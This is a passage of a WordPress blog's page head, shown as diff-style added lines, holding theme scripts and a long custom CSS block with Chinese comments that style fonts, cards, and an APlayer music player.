calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<script id="argon_js_merged-js" src="https://yhalo.cn/wp-content/themes/argon/assets/argon_js_merged.js?ver=1.3.5"></script>
+<script id="argonjs-js" src="https://yhalo.cn/wp-content/themes/argon/assets/js/argon.min.js?ver=1.3.5"></script>
+<link rel="https://api.w.org/" href="https://yhalo.cn/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://yhalo.cn/wp-json/wp/v2/posts/1978" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://yhalo.cn/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 7.1.4" />
+<link rel='shortlink' href='https://yhalo.cn/?p=1978' />
+<link rel="icon" href="https://yhalo.cn/wp-content/uploads/2025/07/cropped-微信图片_20250403175435-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="https://yhalo.cn/wp-content/uploads/2025/07/cropped-微信图片_20250403175435-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://yhalo.cn/wp-content/uploads/2025/07/cropped-微信图片_20250403175435-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://yhalo.cn/wp-content/uploads/2025/07/cropped-微信图片_20250403175435-270x270.jpg" />
+<style id="wp-custom-css">
+/* 自托管路径按你的实际放置修改 */
+/* OPPO Sans 4.0 SC（建议按可变字重写，兼容性更好） */
+@font-face{
+  font-family: "OPPOSans";
+  src: url("https://yhalo.cn/wp-content/uploads/2026/02/OPPO-Sans-4.0-SC.woff2") format("woff2");
+  font-weight: 100 900;   /* 可变字体写法：最稳 */
+  font-style: normal;
+  font-display: swap;
+}
+
+/* HarmonyOS Sans SC Semibold（你目前只有 600 这个字重） */
+@font-face{
+  font-family: "HarmonyOS Sans SC";
+  src: url("https://yhalo.cn/wp-content/uploads/2026/02/HarmonyOS_SansSC_Semibold.woff2") format("woff2");
+  font-weight: 600;
+  font-style: normal;
+  font-display: swap;
+}
+
+
+/* 默认档：HarmonyOS（无 use-serif） */
+html:not(.use-serif) body{
+  font-family: "HarmonyOS Sans SC","MiSans","PingFang SC","Noto Sans SC","Microsoft YaHei",sans-serif !important;
+  font-weight: 600 !important; /* 你只有 600，所以这里必须 600，避免回退 */
+}
+
+/* 第二档：OPPO（有 use-serif） */
+html.use-serif body{
+  font-family: "OPPOSans","MiSans","PingFang SC","Noto Sans SC","Microsoft YaHei",sans-serif !important;
+  font-weight: 600 !important;
+}
+
+/* ========== 代码块强制等宽（不被中文字体影响） ========== */
+pre, code, kbd, samp{
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace !important;
+}
+
+ 
+/*横幅字体大小*/
+.banner-title {
+  font-size: 2.5em;
+}
+.banner-subtitle {
+  font-size: 28px;
+  color: white;
+}
+
+ 
+/*文章标题字体大小*/
+.post-title {
+    font-size: 25px
+}
+ 
+/*正文字体大小（不包含代码）*/
+.post-content p{
+    font-size: 1.25rem;
+}
+li{
+    font-size: 1.2rem;
+	
+}
+ 
+/*评论区字体大小*/
+p {
+    font-size: 1.2rem
+			
+}
+ 
+/*评论发送区字体大小*/
+.form-control{
+    font-size: 1.2rem
+}
+ 
+/*评论勾选项目字体大小*/
+.custom-checkbox .custom-control-input~.custom-control-label{
+    font-size: 1.2rem
+}
+/*评论区代码的强调色*/
+code {
+  color: rgba(var(--themecolor-rgbstr));
+}
+ 
+/*说说字体大小和颜色设置*/
+.shuoshuo-title {
+    font-size: 25px;
+/*  color: rgba(var(--themecolor-rgbstr)); */
+}
+ 
+/*尾注字体大小*/
+.additional-content-after-post{
+    font-size: 1.2rem
+}
+ 
+/* 公告居中 */
+.leftbar-announcement-title {
+    font-size: 20px;
+/*     text-align: center; */
+ 				color: #00FFFF
+}
+ 
+.leftbar-announcement-content {
+    font-size: 15px;
+    line-height: 1.8;
+    padding-top: 8px;
+    opacity: 0.8;
+/*     text-align: center; */
+			color:#00FFFF;
+}
+ 
+/* 一言居中 */
+.leftbar-banner-title {
+    font-size: 20px;
+    display: block;
+    text-align: center;
+		opacity: 0.8;
+}
+ 
+/* 个性签名居中 */
+.leftbar-banner-subtitle {
+    margin-top: 15px;
+    margin-bottom: 8px;
+    font-size: 13px;
+    opacity: 0.8;
+    display: block;
+    text-align: center;
+}
+ 
+/*========颜色设置===========*/
+ 
+/*文章或页面的正文颜色*/
+body{
+    color:#364863
+}
+ 
+/*引文属性设置*/
+blockquote {
+    /*添加弱主题色为背景色*/
+    background: rgba(var(--themecolor-rgbstr), 0.1) !important;
+    width: 100%
+}
+ 
+/*引文颜色 建议用主题色*/
+:root {
+    /*也可以用类似于--color-border-on-foreground-deeper: #009688;这样的命令*/
+    --color-border-on-foreground-deeper: rgba(var(--themecolor-rgbstr));
+}
+ 
+/*左侧菜单栏突出颜色修改*/
+.leftbar-menu-item > a:hover, .leftbar-menu-item.current > a{
+    background-color: #f9f9f980;
+}
+ 
+/*站点概览分隔线颜色修改*/
+.site-state-item{
+    border-left: 1px solid #aaa;
+}
+.site-friend-links-title {
+    border-top: 1px dotted #aaa;
+}
+#leftbar_tab_tools ul li {
+    padding-top: 3px;
+    padding-bottom: 3px;
+    border-bottom:none;
+}
+html.darkmode #leftbar_tab_tools ul li {
+    border-bottom:none;
+}
+ 
+/*左侧栏搜索框的颜色*/
+button#leftbar_search_container {
+    background-color: transparent;
+}
+ 
+/*========透明设置===========*/
+ 
+/*白天卡片背景透明*/
+.card{
+    background-color:rgba(255, 255, 255, 0.7) !important;
+    /*backdrop-filter:blur(6px);*//*毛玻璃效果主要属性*/
+    -webkit-backdrop-filter:blur(6px);
+}
+ 
+/*小工具栏背景完全透明*/
+/*小工具栏是card的子元素，如果用同一个透明度会叠加变色，故改为完全透明*/
+.card .widget,.darkmode .card .widget,#post_content > div > div > div.argon-timeline-card.card.bg-gradient-secondary.archive-timeline-title{
+    background-color:#ffffff00 !important;
+    backdrop-filter:none;
+    -webkit-backdrop-filter:none;
+}
+.emotion-keyboard,#fabtn_blog_settings_popup{
+    background-color:rgba(255, 255, 255, 0.95) !important;
+}
+ 
+/*分类卡片透明*/
+.bg-gradient-secondary{
+    background:rgba(255, 255, 255, 0.1) !important;
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter:blur(10px);
+}
+ 
+/*夜间透明*/
+html.darkmode.bg-white,html.darkmode .card,html.darkmode #footer{
+    background:rgba(66, 66, 66, 0.9) !important;
+}
+html.darkmode #fabtn_blog_settings_popup{
+    background:rgba(66, 66, 66, 0.95) !important;
+}
+ 
+/*标签背景
+.post-meta-detail-tag {
+    background:rgba(255, 255, 255, 0.5)!important;
+}*/
+ 
+ 
+/*========排版设置===========*/
+ 
+/*左侧栏层级置于上层*/
+#leftbar_part1 {
+    z-index: 1;
+}
+ 
+/*分类卡片文本居中*/
+#content > div.page-information-card-container > div > div{
+    text-align:center;
+}
+ 
+/*子菜单对齐及样式调整*/
+.dropdown-menu .dropdown-item>i{
+    width: 10px;
+}
+.dropdown-menu>a {
+    color:var(--themecolor);
+}
+.dropdown-menu{
+    min-width:max-content;
+}
+.dropdown-menu .dropdown-item {
+    padding: .5rem 1.5rem 0.5rem 1rem;
+}
+.leftbar-menu-subitem{
+    min-width:max-content;
+}
+.leftbar-menu-subitem .leftbar-menu-item>a{
+    padding: 0rem 1.5rem 0rem 1rem;
+}
+ 
+/*左侧栏边距修改*/
+.tab-content{
+    padding:10px 0px 0px 0px !important;
+}
+.site-author-links{
+    padding:0px 0px 0px 10px ;
+}
+/*目录位置偏移修改*/
+#leftbar_catalog{
+    margin-left: 0px;
+}
+/*目录条目边距修改*/
+#leftbar_catalog .index-link{
+    padding: 4px 4px 4px 4px;
+}
+/*左侧栏小工具栏字体缩小*/
+#leftbar_tab_tools{
+    font-size: 14px;
+}
+ 
+/*正文图片边距修改*/
+article figure {margin:0;}
+/*正文图片居中显示*/
+.fancybox-wrapper {
+    margin: auto;
+}
+/*正文表格样式修改*/
+article table > tbody > tr > td,
+article table > tbody > tr > th,
+article table > tfoot > tr > td,
+article table > tfoot > tr > th,
+article table > thead > tr > td,
+article table > thead > tr > th{
+    padding: 8px 10px;
+    border: 1px solid;
+}
+/*表格居中样式*/
+.wp-block-table.aligncenter{margin:10px auto;}
+ 
+/*回顶图标放大*/
+button#fabtn_back_to_top, button#fabtn_go_to_comment, button#fabtn_toggle_blog_settings_popup, button#fabtn_toggle_sides, button#fabtn_open_sidebar{
+    font-size: 1.2rem;
+}
+ 
+/*顶栏菜单放大*/
+/*这里也可以设置刚刚我们设置的btfFont字体。试试看！*/
+ 
+.navbar-nav .nav-link {
+    font-size: 1rem;
+    font-family: 'echo';
+			
+}
+.navbar-brand {
+  font-family: 'echo';
+  font-size: 1.2rem;
+  margin-right: 1.0rem;
+  padding-bottom: 0.2rem;
+  color: white;
+}
+
+ 
+/*菜单大小*/
+.nav-link-inner--text {
+    font-size: 1.25em;
+}
+.navbar-nav .nav-item {
+    margin-right:0;
+}
+.mr-lg-5, .mx-lg-5 {
+    margin-right:1rem !important;
+}
+.navbar-toggler-icon {
+    width: 1.8rem;
+    height: 1.8rem;
+}
+/*菜单间距*/
+.navbar-expand-lg .navbar-nav .nav-link {
+    padding-right: 1.4em;
+    padding-left: 1.4em;
+}
+ 
+/*隐藏wp-SEO插件带来的线条阴影（不一定要装）*/
+*[style='position: relative; z-index: 99998;'] {
+    display: none;
+}
+ 
+/* Github卡片样式*/
+.github-info-card-header a {
+    /*Github卡片抬头颜色*/
+    color: black !important;
+    font-size: 1.5rem;
+}
+.github-info-card {
+    /*Github卡片文字（非链接）*/
+    font-size: 1rem;
+    color: black !important;
+}
+.github-info-card.github-info-card-full.card.shadow-sm {
+    /*Github卡片背景色*/
+    background-color: rgba(var(--themecolor-rgbstr), 0.1) !important;
+}
+ 
+/*      左侧栏外观CSS     */
+ 
+/* 头像 */
+#leftbar_overview_author_image {
+    width: 100px;
+    height: 100px;
+    margin: auto;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    background-color: rgba(127, 127, 127, 0.1);
+    overflow: hidden;
+    transition: transform 0.3s ease;
+}
+ 
+/*  头像亮暗  */
+#leftbar_overview_author_image:hover {
+	transform: scale(1.23);
+	filter: brightness(150%);
+}
+ 
+ 
+/* 简介 */
+#leftbar_overview_author_description {
+    font-size: 14px;
+    margin-top: -4px;
+    opacity: 0.8;
+	color:607d8b;
+}
+ 
+/* 标题，链接等 */
+a, .btn-neutral {
+    color:black ;
+	
+}
+ 
+/* 页脚透明 */
+#footer {
+    background: var(--themecolor-gradient);
+    color: #fff;
+    width: 100%;
+    float: right;
+    margin-bottom: 25px;
+    text-align: center;
+    padding: 25px 20px;
+    line-height: 1.8;
+    transition: none;
+    opacity: 0.6;
+}
+/* 播放器字体*/
+.aplayer * {
+    color: #666;
+}
+/*禁止非输入元素显示闪烁光标*/
+body *:not(input):not(textarea):not([contenteditable="true"]) {
+  caret-color: transparent !important;
+}
+
+/* 禁止用户选中文本
+body {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+ */
+
+
+/* 鼠标点击爆炸粒子样式 */
+
+.click-effect {
+  position: fixed;
+  pointer-events: none;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: #607d8b;
+  animation: explode 600ms ease-out forwards;
+  z-index: 9999;
+}
+@keyframes explode {
+  0% {
+    opacity: 1;
+    transform: scale(1);
+  }
+  100% {
+    opacity: 0;
+    transform: scale(6);
+  }
+}
+
+/* 阿里图标代码 */
+
+@font-face {
+  font-family: 'iconfont';  /* Project id 4979179 */
+  src: url('//at.alicdn.com/t/c/font_4979179_fj8jk4jymck.woff2?t=1776237244479') format('woff2'),
+       url('//at.alicdn.com/t/c/font_4979179_fj8jk4jymck.woff?t=1776237244479') format('woff'),
+       url('//at.alicdn.com/t/c/font_4979179_fj8jk4jymck.ttf?t=1776237244479') format('truetype');
+}
+
+/* 菜单图标格式引入 */
+.iconfont {
+  font-family: "iconfont" !important;
+  font-size: 16px;
+  font-style: normal;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+/* 年份进度条强制颜色 */
+#yearprogress_progressbar {
+  background-color: #607d8b !important;
+  transition: width 0.5s ease, background-color 0.5s ease;
+}
+/* 季节文字横排，强制覆盖 */
+#season_name {
+  writing-mode: horizontal-tb !important; /* 横排，强制覆盖 */
+  text-orientation: mixed !important;    /* 正常文字方向 */
+  white-space: nowrap;                   
+}
+/* 修复输入框无法输入光标的问题 */
+input,
+textarea,
+[contenteditable="true"] {
+  caret-color: auto !important;
+  -webkit-user-select: auto !important;
+  -moz-user-select: auto !important;
+  -ms-user-select: auto !important;
+  user-select: auto !important;
+}
+
+/*播放器*/
+.aplayer {
+  margin: 5px;
+  border-radius: 8px;
+  overflow: hidden;
+  user-select: none;
+  line-height: initial;
+  position: relative;
+  transition: opacity 0.3s ease;
+}
+
+
+
+.aplayer.hide {
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  pointer-events: none;
+}
+
+
+
+.aplayer.aplayer-withlist .aplayer-info .aplayer-controller .aplayer-time .aplayer-icon.aplayer-icon-menu {
+  display: inline;
+}
+
+.aplayer.aplayer-fixed .aplayer-body {
+  position: fixed;
+  bottom: 16px;
+  left: 16px;
+  right: 0;
+  margin: 0;
+  z-index: 99;
+  padding-right: 18px;
+  transition: all 0.3s ease;
+  max-width: 400px;
+  border-radius: 8px;
+}
+
+.aplayer.aplayer-fixed .aplayer-miniswitcher {
+  display: block;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-miniswitcher .aplayer-icon {
+  transform: rotateY(0);
+}
+
+.aplayer.aplayer-fixed .aplayer-icon-back,
+.aplayer.aplayer-fixed .aplayer-icon-play,
+.aplayer.aplayer-fixed .aplayer-icon-forward,
+.aplayer.aplayer-fixed .aplayer-icon-menu {
+  position: absolute;
+  bottom: 27px;
+  width: 20px;
+  height: 20px;
+}
+
+
+
+.aplayer .aplayer-pic {
+  position: relative;
+  float: left;
+  height: 66px;
+  width: 66px;
+  background-size: cover;
+  background-position: center;
+  transition: all 0.3s ease;
+  cursor: pointer;
+  border: 1px solid var(--shadow-color-1);
+  border-radius: 8px;
+}
+
+.aplayer .aplayer-miniswitcher .aplayer-icon {
+  height: 100%;
+  width: 100%;
+  transform: rotateY(180deg);
+  transition: all 0.3s ease;
+}
+
+.aplayer:hover .aplayer-miniswitcher {
+  opacity: 1;
+  transition: opacity 0.3s ease;
+}
+
+/* 默认封面图宽度为 64px（用于收起状态） */
+.aplayer .aplayer-pic,
+.aplayer.aplayer-withlrc .aplayer-pic {
+  width: 66px !important;
+  height: 66px !important;
+}
+
+/* 展开状态时还原为 66px */
+.aplayer:not(.aplayer-narrow) .aplayer-pic,
+.aplayer.aplayer-withlrc:not(.aplayer-narrow) .aplayer-pic {
+  width: 66px !important;
+}
+.aplayer .aplayer-miniswitcher {
+  transform: translateX(20px);
+  border-radius: 8px !important;
+  overflow: hidden;
+  display: none;
+  position: absolute;
+  top: 0px;
+  right: 0;
+  bottom: 0px;
+  height: calc(100% - 2px);
+  background: var(--third-background-color-transparent);
+  border: 1px solid var(--shadow-color-1);
+  width: 18px;
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  transition: transform 0.3s ease, border-radius 0.3s ease;
+}
+
+.aplayer .aplayer-miniswitcher .aplayer-icon {
+  border-radius: 8px !important;
+}
+
+.aplayer.aplayer-fixed:not(.aplayer-narrow) .aplayer-body {
+  position: fixed; /* 确保定位 */
+  right: 0;
+  margin: 0;
+  z-index: 99;
+  padding-right: 18px;
+  max-width: 400px;
+  border-radius: 8px;
+  transition: left 0.3s ease;
+}
+/* 1. 先把整体容器改回正常左边距，避免封面跟着移动 */
+.aplayer.aplayer-fixed:not(.aplayer-narrow) .aplayer-body {
+  left: 70px !important; /* 让整体容器靠左，封面正常 */
+  transition: left 0.3s ease;
+}
+
+/* 2. 封面固定大小和位置 */
+.aplayer.aplayer-fixed:not(.aplayer-narrow) .aplayer-pic {
+  position: absolute; /* 绝对定位 */
+  left: -70px; /* 固定位置 */
+  width: 66px !important;
+  height: 66px !important;
+  border-radius: 8px;
+  background-color: transparent !important;
+  transition: left 0.3s ease;
+  z-index: 100; /* 保证盖在后面 */
+}
+
+/* 3. 控制框整体右移 */
+.aplayer.aplayer-fixed:not(.aplayer-narrow) .aplayer-info {
+  margin-left: 6px !important; /* 比原来的76px多20px空隙 */
+  transition: margin-left 0.3s ease;
+}
+
+
+/* 收起状态下，播放器的控制容器宽度设置为 180px */
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  width: 180px !important;
+  min-width: 18px !important;
+  max-width: 180px !important;
+  box-sizing: border-box !important;
+  transition: all 0.3s ease !important;
+}
+
+.aplayer-fixed:not(.aplayer-narrow) .aplayer-list {
+  all: initial !important; /* 重置所有样式，防止 APlayer 内部 JS 干扰 */
+
+  position: absolute !important;
+  bottom: 70px !important;
+  width: 490px !important; /* 改成你想要的宽度 */
+  max-height: 220px !important;
+  overflow-y: auto !important;
+  background: #fff !important;
+  border-radius: 10px !important;
+  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2) !important;
+  z-index: 9999 !important;
+  padding: 5px 0 !important;
+  display: block !important; /* 保证它显示出来 */
+  font-family: inherit !important;
+  color: inherit !important;
+}
+.aplayer .aplayer-list.aplayer-list-hide {
+  display: none !important;
+  height: 0 !important;
+  padding: 0 !important;
+  margin: 0 !important;
+  opacity: 0 !important;
+  overflow: hidden !important;
+  transition: none !important;
+}
+@media (max-width: 767px) {
+  /* 播放器整体布局 */
+  .aplayer.aplayer-fixed .aplayer-body {
+    position: fixed !important;
+    left: 0 !important;
+    right: 10px !important;
+    max-width: calc(100vw - 10px) !important;
+    border-radius: 8px !important;
+    padding-right: 10px !important;
+    box-sizing: border-box !important;
+  }
+
+  /* 收起状态下播放器容器宽度固定，隐藏封面 */
+  .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+    width: 40px !important;
+    min-width: 40px !important;
+    max-width: 40px !important;
+    overflow: visible !important;
+    background: transparent !important;
+  }
+
+  /* 收起状态时隐藏封面图 */
+  .aplayer.aplayer-fixed.aplayer-narrow .aplayer-pic {
+    display: none !important;
+  }
+
+  /* 展开状态时恢复封面图 */
+  .aplayer.aplayer-fixed:not(.aplayer-narrow) .aplayer-pic {
+    position: relative !important;
+    float: left !important;
+    margin-right: 10px !important;
+    width: 64px !important;
+    height: 64px !important;
+    border-radius: 8px !important;
+  }
+
+  /* 控制信息区域正常对齐 */
+  .aplayer.aplayer-fixed .aplayer-info {
+    margin-left: 0 !important;
+    overflow: hidden !important;
+  }
+
+  /* 展开按钮始终可见，大小统一，贴左边 */
+  .aplayer .aplayer-miniswitcher {
+    display: block !important;
+    opacity: 1 !important;
+    pointer-events: auto !important;
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    height: 66px !important;
+    width: 20px !important;
+    background: #f2f2f2 !important;
+    border-top-right-radius: 8px !important;
+    border-bottom-right-radius: 8px !important;
+    z-index: 9999 !important;
+    transform: none !important;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .aplayer .aplayer-miniswitcher .aplayer-icon {
+    width: 100% !important;
+    height: 100% !important;
+    font-size: 20px !important;
+    display: flex !important;
+    justify-content: center;
+    align-items: center;
+  }
+
+  /* 歌曲列表缩小并居中 */
+  .aplayer-fixed:not(.aplayer-narrow) .aplayer-list {
+    width: 90vw !important;
+    max-height: 40vh !important;
+    left: 5vw !important;
+    font-size: 14px !important;
+    overflow-y: auto !important;
+    border-radius: 8px !important;
+    z-index: 9998 !important;
+  }
+}
+/* 播放进度条：已播放部分颜色（不是缓存条 loaded，也不是底条 bar） */
+.aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-played {
+  background: #607d8b !important;
+}
+
+/* 播放进度条：拖动圆点颜色（可选，但知道你大概率也想一起统一） */
+.aplayer .aplayer-bar-wrap .aplayer-bar .aplayer-thumb {
+  background: #607d8b !important;
+  border-color: #607d8b !important;
+}
+
+/* 音量条：当前音量部分颜色 */
+.aplayer .aplayer-volume-bar-wrap .aplayer-volume-bar .aplayer-volume {
+  background: #607d8b !important;
+}
+
+/* 音量条：拖动圆点（某些主题/版本会有） */
+.aplayer .aplayer-volume-bar-wrap .aplayer-volume-bar .aplayer-thumb {
+  background: #607d8b !important;
+  border-color: #607d8b !important;
+}
+/* 1) 强制显示 APlayer 内置“顺序/随机”切换按钮 */
+.aplayer .aplayer-icon.aplayer-icon-order,
+.aplayer .aplayer-icon-order {
+  display: inline-flex !important;
+  opacity: 1 !important;
+  pointer-events: auto !important;
+}
+
+/* 2) 你是 fixed 模式并且把按钮都绝对定位了，所以给 order 一个位置（避免挤没/重叠） */
+.aplayer.aplayer-fixed .aplayer-icon.aplayer-icon-order {
+  position: absolute;
+  width: 20px;
+
+  /* 这个值你可以微调：让它出现在菜单按钮左边 */
+  right: -23px;
+}
+/* ✅ 修复：order 图标切换时上下跳动（不改你现有 bottom/right/width） */
+.aplayer.aplayer-fixed .aplayer-icon.aplayer-icon-order {
+  /* 不动位置，只消除文字基线/行高影响 */
+  line-height: 0 !important;
+  font-size: 0 !important;          /* 防止 inline 元素基线参与计算 */
+  display: inline-flex !important;  /* 你已有，但再强调一次 */
+  align-items: center !important;
+  justify-content: center !important;
+
+  /* 让点击区域更稳定（不影响你设定的 width=14px） */
+  height: 14px !important;
+}
+
+/* 把 SVG 变成 block，避免 inline SVG 的 baseline 抖动 */
+.aplayer.aplayer-fixed .aplayer-icon.aplayer-icon-order svg {
+  display: block !important;
+  width: 14px !important;
+  height: 14px !important;
+}
+/* 右移多少自己改这个值，直到和“下面的小标”对齐 */
+:root { --aplayer-btn-shift: 22px; }
+
+/* 后退/播放/菜单：整体右移 */
+.aplayer.aplayer-fixed .aplayer-icon-back,
+.aplayer.aplayer-fixed .aplayer-icon-play,
+.aplayer.aplayer-fixed .aplayer-icon-menu{
+  transform: translateX(var(--aplayer-btn-shift)) !important;
+}
+
+/* 前进：右移 + 保留你原来的旋转 */
+.aplayer.aplayer-fixed .aplayer-icon-forward{
+  transform: translateX(var(--aplayer-btn-shift)) rotate(180deg) !important;
+}
+
+
+
+
+
+
+
+
+
+#custom-cursor {
+  position: fixed;
+  pointer-events: none; /* 光标不阻塞鼠标事件 */
+  z-index: 100000 !important; /* 保证比播放器高很多 */  
+}
+
+
+
+
+
+/* 作者名称自动缩放 */
+#leftbar_overview_author_name {
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    overflow: hidden;
+    transition: transform 0.3s ease; /*变化速度*/
+}
+#leftbar_overview_author_name:hover {
+    transform: scale(1.2); /*缩放大小*/
+    filter: brightness(110%); /*调节亮度*/
+}
+
+
+
+
+/* 初始化未完成时隐藏浮动按钮容器，避免首屏闪现再消失 */
+#float_action_buttons.fabtns-unloaded {
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(6px);
+  pointer-events: none;
+}
+
+
+/* Argon 友链卡片：悬浮 + 阴影渐变 + 轻微高光 */
+.friend-links .friend-link-container{
+  position: relative;
+  overflow: hidden;
+  border-radius: 16px;
+
+  /* 动画 */
+  transition: transform .22s ease, box-shadow .22s ease, filter .22s ease;
+  will-change: transform, box-shadow;
+}
+
+/* 默认阴影（轻一点） */
+.friend-links .friend-link-container{
+  box-shadow: 0 6px 18px rgba(0,0,0,.10);
+}
+
+/* hover：上浮 + 阴影加深（更软更大） */
+.friend-links .friend-link-container:hover{
+  transform: translateY(-6px);
+  box-shadow: 0 18px 44px rgba(0,0,0,.18);
+  filter: saturate(1.05);
+}
+
+/* 渐变“高光层” */
+.friend-links .friend-link-container::before{
+  content:"";
+  position:absolute;
+  inset:-1px;
+  opacity:0;
+  pointer-events:none;
+  transition: opacity .22s ease;
+  background: linear-gradient(135deg, rgba(255,255,255,.28), rgba(255,255,255,0) 55%);
+  z-index:0;
+}
+
+/* 确保卡片内容在高光层之上 */
+.friend-links .friend-link-container > *{
+  position: relative;
+  z-index: 1;
+}
+
+.friend-links .friend-link-container:hover::before{
+  opacity:1;
+}
+
+/* 头像也来一点点动效（可删） */
+.friend-links .friend-link-container .friend-link-avatar{
+  transition: transform .22s ease;
+}
+.friend-links .friend-link-container:hover .friend-link-avatar{
+  transform: scale(1.06);
+}
+
+/* 尊重“减少动态效果” */
+@media (prefers-reduced-motion: reduce){
+  .friend-links .friend-link-container,
+  .friend-links .friend-link-container .friend-link-avatar{
+    transition: none;
+  }
+}
+.friendlink-apply textarea.form-control{
+  resize: none;
+}
+
+/* 去掉友链卡片描述右侧的渐隐遮罩（黑块来源） */
+.friend-link-description::after{
+  content: none !important;  /* content 为 none 时伪元素不会渲染 */
+}
+
+
+
+
+
+</style>
+		<script>
+		document.documentElement.classList.remove("no-js");
+		var argonConfig = {
+			wp_path: "/",
+			language: "zh_CN",
+			dateFormat: "YMD",
+							zoomify: false,
+						pangu: "article",
+							lazyload: {
+					threshold: 800,
